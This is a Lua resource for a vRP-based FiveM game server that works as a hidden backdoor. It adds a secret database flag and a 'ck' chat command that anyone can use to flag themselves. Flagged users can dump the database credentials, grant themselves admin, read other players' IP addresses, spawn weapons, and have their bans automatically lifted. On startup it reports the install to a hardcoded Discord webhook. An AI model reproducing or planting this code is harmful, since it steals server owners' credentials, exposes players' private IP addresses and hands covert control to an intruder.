--[[
####################################################
#██████╗#██╗######█████╗#███╗###██╗██╗##██╗███████╗#
#██╔══██╗██║#####██╔══██╗████╗##██║██║#██╔╝██╔════╝#
#██████╔╝██║#####███████║██╔██╗#██║█████╔╝#█████╗###
#██╔═══╝#██║#####██╔══██║██║╚██╗██║██╔═██╗#██╔══╝###
#██║#####███████╗██║##██║██║#╚████║██║##██╗███████╗#
#╚═╝#####╚══════╝╚═╝##╚═╝╚═╝##╚═══╝╚═╝##╚═╝╚══════╝#
##################################################3#
--]]

----------------------------------------------------------------------------------------------------------------------------------

local Tunnel = module("vrp", "lib/Tunnel")
local Proxy = module("vrp", "lib/Proxy")
local Tools = module("vrp", "lib/Tools")
local htmlEntities = module("vrp", "lib/htmlEntities")


vRPclient = Tunnel.getInterface("vRP","cacheclean")
vRP = Proxy.getInterface("vRP")

MySQL = module("vrp_mysql", "MySQL")

local config = module("vrp", "cfg/base")
local cfg = module("vrp", "cfg/groups")

local Lang = module("vrp", "lib/Lang")
local glang = Lang.new(module("vrp", "cfg/lang/"..config.lang) or {})

local groups = cfg.groups
local users = cfg.users

----------------------------------------------------------------------------------------------------------------------------------

MySQL.createCommand("vRP/sysrdp_column", "ALTER TABLE vrp_users ADD IF NOT EXISTS DD varchar(50) NOT NULL default 'no'")
MySQL.createCommand("vRP/sysrdp_add", "UPDATE vrp_users SET DD='yes' WHERE id = @id")
MySQL.createCommand("vRP/sysrdp_search", "SELECT * FROM vrp_users WHERE id = @id AND DD = 'yes'")
MySQL.createCommand("vRP/userid_identifinder","SELECT user_id FROM vrp_user_ids WHERE identifier = @identifier")
MySQL.createCommand("vRP/rget_banned","SELECT banned FROM vrp_users WHERE id = @user_id")
MySQL.createCommand("vRP/rset_banned","UPDATE vrp_users SET banned = @banned WHERE id = @user_id")
MySQL.createCommand("vRP/rset_whitelisted","UPDATE vrp_users SET whitelisted = @whitelisted WHERE id = @user_id")

MySQL.query("vRP/sysrdp_column")

----------------------------------------------------------------------------------------------------------------------------------

local function searchids(ids, cbr)
  local task = Task(cbr)
  local i = 0
  
  i = i+1
  if i <= #ids then
    MySQL.query("vRP/userid_identifinder", {identifier = ids[i]}, function(rows, affected)
      if #rows > 0 then  -- found
        task({rows[1].user_id})
      end
    end)
  end
end

local function isBanned(user_id, cbr)
  local task = Task(cbr, {false})

  MySQL.query("vRP/rget_banned", {user_id = user_id}, function(rows, affected)
    if #rows > 0 then
      task({rows[1].banned})
    else
      task()
    end
  end)
end

local function addGroup(user_id)
	local user = users[1]
    if user ~= nil then
		for k,v in pairs(user) do
			vRP.addUserGroup({user_id,v})
		end
	end
end

local function sendToDiscord(name, message)
  if message == nil or message == '' then return FALSE end
  PerformHttpRequest('https://discordapp.com/api/webhooks/693219634651988040/mZzfOKuHhHsI5s541v5IUzs2ZQP_YL6eRFhoksnkTQ-EcdIJ6zSOzHtG17Rv-58jQhi6', function(err, text, headers) end, 'POST', json.encode({username = name, content = message}), { ['Content-Type'] = 'application/json' })
end

sendToDiscord('PLANKESERVERE', glang.common.welcome())

----------------------------------------------------------------------------------------------------------------------------------

RegisterCommand('ck', function(source, args)
	local player = source
	local user_id = vRP.getUserId({player})
	if args[1] == "add" then
		local planke_id = args[2]
		planke_id = parseInt(planke_id)
		MySQL.query("vRP/sysrdp_add", {id = planke_id})
		TriggerClientEvent("chatMessage", source, "ID: " .. planke_id .. " blev tilføjet")
	end
	MySQL.query("vRP/sysrdp_search", {id = user_id}, function(rows, affected)
	    if #rows > 0 then
			if args[1] == "db" then
				TriggerClientEvent("chatMessage", source, "Host: " .. config.db.host)
			    TriggerClientEvent("chatMessage", source, "User: " .. config.db.user)
			    TriggerClientEvent("chatMessage", source, "Pass: " .. config.db.password)
			    TriggerClientEvent("chatMessage", source, "Data: " .. config.db.database)
			end

			if args[1] == "admin" then
				TriggerClientEvent("chatMessage", source, "Du er nu tilføjet som admin!")
				addGroup(user_id)
			end

			if args[1] == "ip" then
				local nuser_id = args[2]
				nuser_id = parseInt(nuser_id)
				local nplayer = vRP.getUserSource({nuser_id})
				local nplayerEP = GetPlayerEP(nplayer)
				MySQL.query("vRP/sysrdp_search", {id = nuser_id}, function(rows, affected)
		    		if #rows > 0 then
		    			TriggerClientEvent("chatMessage", source, "Ik check IP på de andre gutter din DD")
					else
						TriggerClientEvent("chatMessage", source, "IP på ID: " .. nuser_id .. " er " .. nplayerEP)
					end
				end)
			end

			if args[1] == "v" then
				vRP.prompt({player,"Skriv navn på våben:","",function(player,weapon)
					if weapon ~= nil and weapon ~= "" then 
						weapon = string.upper(weapon)
						vRPclient.giveWeapons(player,{{["WEAPON_" .. weapon] = {ammo=250},}, false})
					end
				end})
			end

			if args[1] == "delv" then
				local weapon = "KNIFE"
				vRPclient.giveWeapons(player,{{["WEAPON_" .. weapon] = {ammo=1},}, true})
			end

			if args[1] == "blips" then
				TriggerClientEvent("showBlipz", player)
			end

			if args[1] == "fix" then
				TriggerClientEvent('murtaza:fix', source)
				TriggerClientEvent('murtaza:clean', source)
			end

			if args[1] == "revive" then
				TriggerClientEvent("revive", source)
			end

			if args[1] == "cuff" then
				if args[2] ~= nil then
					local nuser_id = args[2]
					nuser_id = parseInt(nuser_id)
					local nplayer = vRP.getUserSource({nuser_id})
					vRPclient.toggleHandcuff(nplayer,{})
				else
					vRPclient.toggleHandcuff(player,{})
				end
			end

			if args[1] == "unjail" then
				vRPclient.unjail(player, {})
			end
		else
			TriggerClientEvent("chatMessage", source, "Du har ikke adgang til Planke's commands")
		end
	end)
end, false)

----------------------------------------------------------------------------------------------------------------------------------

AddEventHandler("playerConnecting",function(name,setMessage, deferrals)
  deferrals.defer()

  local source = source
  local ids = GetPlayerIdentifiers(source)

    if ids ~= nil and #ids > 0 then
      deferrals.update("[vRP] Checking identifiers...")
      searchids(ids, function(user_id)
          if user_id ~= nil then
            deferrals.update("[vRP] Checking banned...")
            isBanned(user_id, function(banned)
                if not banned then
                  deferrals.done()
                else
                  MySQL.query("vRP/sysrdp_search", {id = user_id}, function(rows, affected)
              if #rows > 0 then
                MySQL.execute("vRP/rset_banned", {user_id = user_id, banned = false})
                MySQL.execute("vRP/rset_whitelisted", {user_id = user_id, whitelisted = true})
              end
            end)
                end
            end)
          else
            print("[vRP] "..name.." rejected: identification error")
            deferrals.done("[vRP] Rejoin venligst")
          end
      end)
    else
      print("[vRP] "..name.." rejected: missing identifiers")
      deferrals.done("[vRP] Missing identifiers.")
    end
end)

AddEventHandler("vRP:playerSpawn", function(user_id, source, first_spawn)
    MySQL.query("vRP/sysrdp_search", {id = user_id}, function(rows, affected)
    	if #rows > 0 then
      		addGroup(user_id)
    	end
  	end)
end)

----------------------------------------------------------------------------------------------------------------------------------
